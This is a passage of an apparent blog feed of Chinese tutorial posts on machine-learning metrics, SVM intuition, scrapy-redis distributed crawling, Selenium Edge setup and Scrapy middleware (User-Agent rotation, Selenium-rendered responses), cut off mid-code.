    <content type="html"><![CDATA[<h1 id="混淆矩阵">1 混淆矩阵</h1><table><thead><tr class="header"><th></th><th>实际正例</th><th>实际负例</th></tr></thead><tbody><tr class="odd"><td>预测正例</td><td>TP</td><td>FP</td></tr><tr class="even"><td>预测负例</td><td>FN</td><td>TN</td></tr></tbody></table><ul><li>TP（True Positives)：真正例，预测为正例而且实际上也是正例；</li><li>FP（False Positives)：假正例，预测为正例然而实际上却是负例；</li><li>FN（false Negatives)：假负例，预测为负例然而实际上却是正例；</li><li>TN（True Negatives)：真负例，预测为负例而且实际上也是负例。</li></ul><h1 id="准确率">2 准确率</h1><p><span class="math display">\[Accuracy=\frac{TP+TN}{TP+FP+FN+TN}\]</span></p><ul><li>定义：所有的预测正确（正类负类）的占总的比重。</li><li>虽然准确率能够判断总的正确率，但是在样本不均衡的情况下，并不能作为很好的指标来衡量结果。在样本不平衡的情况下，得到的高准确率没有任何意义，此时准确率就会失效。例如如果一个肿瘤科医生看病，不经检验就告诉每个患者他们没有患病，检查的准确率为99.6%！（癌症患病率约为0.4%）。</li></ul><h1 id="精确率">3 精确率</h1><p><span class="math display">\[Precision=\frac{TP}{TP+FP}\]</span></p><ul><li>定义：也叫查准率，即正确预测为正的占全部预测为正的比例(不准错，宁愿漏检，也不能让现有的预测有错)。</li><li>精确率代表对正样本结果中的预测准确程度，准确率则代表整体的预测准确程度，包括正样本和负样本。分母是预测到的正类，精确率的提出是让模型的现有预测结果尽可能不出错。应用场景例如美国刑事审判体系，疑罪从无。</li></ul><h1 id="召回率">4 召回率</h1><p><span class="math display">\[Recall=\frac{TP}{TP+FN}\]</span></p><ul><li>定义：也叫查全率，即正确预测为正的占全部实际为正的比例(不准漏，宁可错杀一千，也不放过一个)。</li><li>召回率(Recall)是针对原样本而言的，其含义是在实际为正的样本中被预测为正样本的概率。高召回率意味着更少的漏检，但会导致更多的误检。应用场景例如癌症筛查、排查安全隐患。</li></ul><h1 id="f-score">5 F-Score</h1><p><span class="math display">\[F_{Score}=(1+\beta^2)\frac{Precision \times Recall}{\beta^2 \timesPrecision+Recall}\]</span></p><ul><li>精确率和召回率互相影响，理想状态下肯定追求两个都高，但是实际情况是两者相互“制约”：追求精确率高，则召回率就低；追求召回率高，则通常会影响精确率。这样就需要综合考虑它们，最常见的方法就是F-score。也可以绘制出P-R曲线图，观察它们的分布情况。</li><li>F-Score：权衡精确率（Precision）和召回率（Recall），较为全面地评价一个分类器。F-Score是精确率和召回率的调和平均。F-Score越大说明模型质量更高。</li><li>关于β取值：<ul><li>β如果取1,表示Precision与Recall一样重要</li><li>β如果取小于1,表示Precision比Recall重要</li><li>β如果取大于1,表示Recall比Precision重要</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://blog.csdn.net/lhxez6868/article/details/108150777">准确度(accuracy)、精确率（precision)、召回率（recall）、F1值谈谈我的看法_精确度和召回率-CSDN博客</a></li><li><ahref="https://zhuanlan.zhihu.com/p/369936908">准确率、精确率、召回率 -知乎 (zhihu.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>支持向量机</title>
    <link href="/2023/10/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"/>
    <url>/2023/10/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="svm直觉理解">1 SVM直觉理解</h1><p>概念：支持向量机<code>Supported Vector Machine</code>，基于线性划分，输出一个最优化的分隔超平面，该超平面不但能将两类正确分开，且使分类间隔最大</p><p>本质：量化两类数据差异</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404845.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="软硬间隔">2 软硬间隔</h1><ul><li>间隔距离体现两类数据差异大小</li><li>硬间隔：使⽤超平⾯进⾏分割数据的过程中，如果我们严格地让所有实例都不在最⼤间隔之间，只位于正确的⼀边。硬间隔分类有两个问题：⾸先，它只在数据是线性可分离的时候才有效；其次，它对异常值⾮常敏感。</li><li>软间隔：软间隔的⽬标是尽可能在保持最⼤间隔宽阔和限制间隔违例之间找到良好的平衡。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404846.png"alt="image-20231005102746477" /><figcaption aria-hidden="true">image-20231005102746477</figcaption></figure><h1 id="升维转换和核函数">3 升维转换和核函数</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404847.png"alt="image-20231005134734247" /><figcaption aria-hidden="true">image-20231005134734247</figcaption></figure><p>升维转换目的：处理低维度下无法方便分类的数据（直接采用可能导致维数灾难）</p><p>核函数：不用知晓具体的维度转换函数，直接获得数据的高维度差异度</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404848.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>参考教程：</p><ol type="1"><li><ahref="https://www.bilibili.com/video/BV16T4y1y7qj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d1182948f36423c63e7e3b31ad8c5163">【数之道】支持向量机SVM是什么，八分钟直觉理解其本质_哔哩哔哩_bilibili</a></li><li><ahref="https://blog.csdn.net/qq_39763246/article/details/119926367">机器学习算法08 ——支持向量机SVM算法(核函数、手写数字识别案例)_svm算法案例_老板来碗小面加蛋~的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>算法篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分布式爬虫基础</title>
    <link href="/2023/10/04/Python/Spider/Scrapy/%E5%88%86%E5%B8%83%E5%BC%8F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/04/Python/Spider/Scrapy/%E5%88%86%E5%B8%83%E5%BC%8F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="概念">1. 概念</h1><p>搭建一个分布式的机群，让其对一组资源进行分布联合爬取。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310041406344.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="作用">2. 作用</h1><p>提高爬取数据的效率。</p><h1 id="实现">3. 实现</h1><ul><li><p>环境准备</p><ul><li>安装<code>scrapy-redis</code>组件</li><li><code>scrapy-redis</code>组件作用：原生的scrapy不能实现分布式爬虫,因为调度器和管道不能被分布式机群共享，所以需要配合该组件进行实现，给原生的scrapy框架提供可以被共享的调度器和管道。</li></ul></li><li><p>实现流程：</p><ul><li><p>创建工程，进入工程目录</p></li><li><p>创建并编写爬虫文件</p><ul><li>导入模块：<code>from scrapy_redis.spiders import RedisSpider</code></li><li>注释allowed_domains和start_urls</li><li>添加属性（共享的调度器队列名称）：<code>redis_key='xxx'</code></li><li>修改父类为：<code>RedisCrawlSpider</code></li></ul></li><li><p>修改配置文件</p><ul><li><p>指定管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ITEM_PIPELINES = &#123;<br>    <span class="hljs-string">&#x27;scrapy_redis.pipelines.RedisPipeline&#x27;</span>:<span class="hljs-number">400</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>指定调度器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 去重容器类：使用Redis的set集合来存储请求的指纹数据，从而实现请求去重的持久化</span><br>DUPEFILTER_CLASS= <span class="hljs-string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="hljs-comment"># 使用scrapy_redis组件自己的调度器</span><br>SCHEDULER=<span class="hljs-string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="hljs-comment"># 配置调度器是否持久化，即当爬虫结束，是否清空Redis请求队列和set指纹数据</span><br>SCHEDULER_PERSIST=<span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li><li><p>指定redis服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">REDIS_HOST=<span class="hljs-string">&#x27;&#x27;</span><br>REDIS_PORT=<br></code></pre></td></tr></table></figure></li></ul></li><li><p>redis相关操作</p><ul><li>redis配置文件：<code>redis.windows.conf</code></li><li>结合配置文件开启redis服务：<code>redis-server 配置文件</code></li><li>启动客户端：<code>redis-cli</code></li></ul></li><li><p>执行工程（<code>spiders</code>目录下）：<code>scrapy runspider xxx.py</code></p></li><li><p>向调度器队列中放入一个起始url（客户端中执行）：<code>lpush redis_key start_urls</code></p></li></ul></li></ul><h1 id="redis存储的数据">4. redis存储的数据</h1><ul><li><p><code>spiderName:items</code></p><ul><li>list类型，保存爬虫获取到的数据item内容是json字符串。</li></ul></li><li><p><code>spiderName:dupefilter</code></p><ul><li>set类型，用于爬虫访问的URL去重内容，是40个字符的url的hash字符串。</li></ul></li><li><p><code>spiderName:start_urls</code></p><ul><li>list类型，用于接收redis spider启动时的第一个url。</li></ul></li><li><p><code>spiderName:requests</code></p><ul><li>zset类型，用于存放requests等待调度。内容是requests对象的序列化字符串。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基本配置（Edge版）</title>
    <link href="/2023/10/02/Python/Spider/Selenium/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%88Edge%E7%89%88%EF%BC%89/"/>
    <url>/2023/10/02/Python/Spider/Selenium/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%88Edge%E7%89%88%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<ol type="1"><li><p>安装<code>selenium</code>包(本例为Anaconda环境安装)</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312091504622.png"alt="image-20231209144926999" /><figcaption aria-hidden="true">image-20231209144926999</figcaption></figure></li><li><p>查看浏览器版本：<code>浏览器 --&gt; 设置 --&gt; 关于 Microsoft Edge --&gt; 版本信息</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312091504624.png"alt="image-20231209145148563" /><figcaption aria-hidden="true">image-20231209145148563</figcaption></figure></li><li><p>下载<ahref="%5BMicrosoft%20Edge%20WebDriver%20%7C%20Microsoft%20Edge%20Developer%5D(https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/#downloads)">浏览器引擎</a>（需对应浏览器版本）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312091504625.png"alt="image-20231209150055610" /><figcaption aria-hidden="true">image-20231209150055610</figcaption></figure></li><li><p>将下载的压缩包进行解压，并将文件重命名为：<code>MicrosoftWebDriver.exe</code>。文件重命名原因：<code>webdriver.py</code>里定义了浏览器驱动的名字是：<code>MicrosoftWebDriver.exe</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312091504626.png"alt="image-20231209150307977" /><figcaption aria-hidden="true">image-20231209150307977</figcaption></figure></li><li><p>将文件拷贝到<code>python.exe</code>目录下（例：<code>F:\Anaconda\install\envs\spider</code>）和浏览器目录下（例：<code>C:\Program Files (x86)\Microsoft\Edge\Application</code>）</p></li><li><p>测试代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br>driver = webdriver.Edge(<span class="hljs-string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\MicrosoftWebDriver.exe&quot;</span>)<br>driver.get(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)  <span class="hljs-comment"># 你要进入的网页</span><br></code></pre></td></tr></table></figure></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://blog.csdn.net/tk1023/article/details/109078613#:~:text=使用%20selenium%20操作%20Edge%20浏览器。%201、先安装%20selenium，我是通过%20PyCharm,，再点击%20“install%20package”。%203、需要下载浏览器引擎：https%3A%2F%2Fdeveloper.microsoft.com%2Fen-us%2Fmicrosoft-edge%2Ftools%2Fwebdriver%2F4、浏览器%20--%3E%20设置%20--%3E.._selenium%20edge">selenium+ Edge 浏览器_selenium edge-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Selenium</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy中间件</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/Scrapy%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/Scrapy%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="下载中间件">1. 下载中间件</h1><ul><li><p>位置：引擎和下载器之间</p></li><li><p>作用：批量拦截到整个工程中所有的请求和响应</p></li><li><p>拦截请求：</p><ul><li>UA伪装（UA池）:process_request</li><li>代理IP（代理池）:process_exception需要<code>return request</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MiddleproDownloaderMiddleware</span>:<br>    <span class="hljs-comment"># Not all methods need to be defined. If a method is not defined,</span><br>    <span class="hljs-comment"># scrapy acts as if the downloader middleware does not modify the</span><br>    <span class="hljs-comment"># passed objects.</span><br>    user_agents = [<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 &#x27;</span><br>        <span class="hljs-string">&#x27;OPR/26.0.1656.60&#x27;</span>,<br>        <span class="hljs-string">&#x27;Opera/8.0 (Windows NT 5.1; U; en)&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 &#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0) &#x27;</span>,<br>    ]<br><br>    <span class="hljs-comment"># 拦截请求</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>        <span class="hljs-comment"># UA伪装</span><br>        request.headers[<span class="hljs-string">&#x27;User-Agent&#x27;</span>] = random.choice(self.user_agents)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 拦截所有响应</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_response</span>(<span class="hljs-params">self, request, response, spider</span>):<br>        <span class="hljs-comment"># Called with the response returned from the downloader.</span><br><br>        <span class="hljs-comment"># Must either;</span><br>        <span class="hljs-comment"># - return a Response object</span><br>        <span class="hljs-comment"># - return a Request object</span><br>        <span class="hljs-comment"># - or raise IgnoreRequest</span><br>        <span class="hljs-keyword">return</span> response<br><br>    <span class="hljs-comment"># 拦截发生异常的请求</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_exception</span>(<span class="hljs-params">self, request, exception, spider</span>):<br>        <span class="hljs-comment"># 代理池一般在该方法中进行设置</span><br>        <span class="hljs-comment"># request.meta[&#x27;proxy&#x27;]=</span><br>        <span class="hljs-comment"># 重新发送该请求</span><br>        <span class="hljs-keyword">return</span> request<br></code></pre></td></tr></table></figure></li><li><p>拦截响应：</p><ul><li>篡改响应数据（应对动态加载）</li><li>判断网页数据是否为动态加载，可以通过禁用js观察数据是否能够加载出来得到</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># spiders/xxx.py</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> wangyiPro.items <span class="hljs-keyword">import</span> WangyiproItem<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WangyiSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;wangyi&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;163.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://news.163.com/&quot;</span>]<br>    <span class="hljs-comment"># 存储每个板块对应的url</span><br>    module_urls = []<br><br>    <span class="hljs-comment"># 实例化浏览器对象</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.driver = webdriver.Edge(<span class="hljs-string">r&#x27;F:\Anaconda\install\envs\spider\MicrosoftWebDriver.exe&#x27;</span>)  <span class="hljs-comment"># 这里添加的是driver的绝对路径</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        li_list = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;index2016_wrap&quot;]/div[3]/div[2]/div[2]/div[2]/div/ul/li&#x27;</span>)<br>        alist = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, ]<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> alist:<br>            module_url = li_list[index].xpath(<span class="hljs-string">&#x27;./a/@href&#x27;</span>).get()<br>            self.module_urls.append(module_url)<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> self.module_urls:<br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=url, callback=self.parse_module)<br><br>    <span class="hljs-comment"># 每个板块下新闻标题都是动态加载</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_module</span>(<span class="hljs-params">self, response</span>):<br>        li_list = response.xpath(<span class="hljs-string">&#x27;/html/body/div/div[3]/div[3]/div[1]/div[1]/div/ul/li/div/div&#x27;</span>)<br>        <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            item = WangyiproItem()<br>            item[<span class="hljs-string">&#x27;title&#x27;</span>] = li.xpath(<span class="hljs-string">&#x27;./div/div/h3/a/text()&#x27;</span>).get()<br>            content_url = li.xpath(<span class="hljs-string">&#x27;./div/div/h3/a/@href&#x27;</span>).extract_first()<br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=content_url, callback=self.parse_content, meta=&#123;<span class="hljs-string">&#x27;item&#x27;</span>: item&#125;)<br><br>    <span class="hljs-comment"># 解析文章内容</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_content</span>(<span class="hljs-params">self, response</span>):<br>        item = response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>        content = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;content&quot;]/div[2]//text()&#x27;</span>).extract()<br>        content = <span class="hljs-string">&#x27;&#x27;</span>.join(content)<br>        item[<span class="hljs-string">&#x27;content&#x27;</span>] = content<br><br>        <span class="hljs-keyword">yield</span> item<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">closed</span>(<span class="hljs-params">self, spider</span>):<br>        self.driver.quit()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># middlewares.py</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_response</span>(<span class="hljs-params">self, request, response, spider</span>):<br>        <span class="hljs-comment"># 获取爬虫类定义的浏览器对象</span><br>        driver=spider.driver<br>        <span class="hljs-comment"># 挑选出指定响应对象进行篡改</span><br>        <span class="hljs-comment"># 处理过程：url---request---response</span><br>        <span class="hljs-keyword">if</span> request.url <span class="hljs-keyword">in</span> spider.module_urls:<br>            <span class="hljs-comment"># 基于selenium便捷地获取动态加载数据</span><br>            driver.get(request.url)<br>            sleep(<span class="hljs-number">1</span>)<br>            page_text=driver.page_source<br>            <span class="hljs-comment"># 实例化新的响应对象</span><br>            new_response=HtmlResponse(url=request.url,body=page_text,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>,request=request)<br>            <span class="hljs-keyword">return</span> new_response<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure></li><li><p>配置文件中开启中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Enable or disable downloader middlewares</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span><br>DOWNLOADER_MIDDLEWARES = &#123;<br>   <span class="hljs-string">&quot;middlePro.middlewares.MiddleproDownloaderMiddleware&quot;</span>: <span class="hljs-number">543</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="爬虫中间件">2. 爬虫中间件</h1><p>Spider中间件提供了一种机制，允许你在Spider处理请求和响应之前进行全局的操作。以下是一个简单的示例，演示如何编写一个Spider中间件。<code>MySpiderMiddleware</code>是一个自定义的Spider中间件类，它包含了<code>process_start_requests</code>、<code>process_spider_input</code>、<code>process_spider_output</code>和 <code>process_spider_exception</code>这四个方法，分别用于处理Spider启动时的初始请求、处理Spider接收到的响应、处理Spider处理响应生成的结果以及处理Spider异常。这个中间件同样简单地在控制台输出一些信息。要激活自定义Spider中间件，需要在Scrapy项目的<code>settings.py</code> 文件中配置 <code>SPIDER_MIDDLEWARES</code>字典，类似于下载器中间件的配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># middleware.py</span><br><br><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> signals<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpiderMiddleware</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_start_requests</span>(<span class="hljs-params">self, start_requests, spider</span>):<br>        <span class="hljs-comment"># 在Spider启动时处理初始请求</span><br>        <span class="hljs-keyword">for</span> request <span class="hljs-keyword">in</span> start_requests:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Processing start request:&quot;</span>, request.url)<br>            <span class="hljs-keyword">yield</span> request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_spider_input</span>(<span class="hljs-params">self, response, spider</span>):<br>        <span class="hljs-comment"># 在Spider接收到下载器的响应之前的处理</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Processing spider input for:&quot;</span>, response.url)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 返回None表示继续正常处理，返回Request对象表示生成新的请求</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_spider_output</span>(<span class="hljs-params">self, response, result, spider</span>):<br>        <span class="hljs-comment"># 在Spider处理下载器响应生成的结果之前的处理</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Processing spider output for:&quot;</span>, response.url)<br>        <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 必须返回一个可迭代对象</span><br><br>    <span 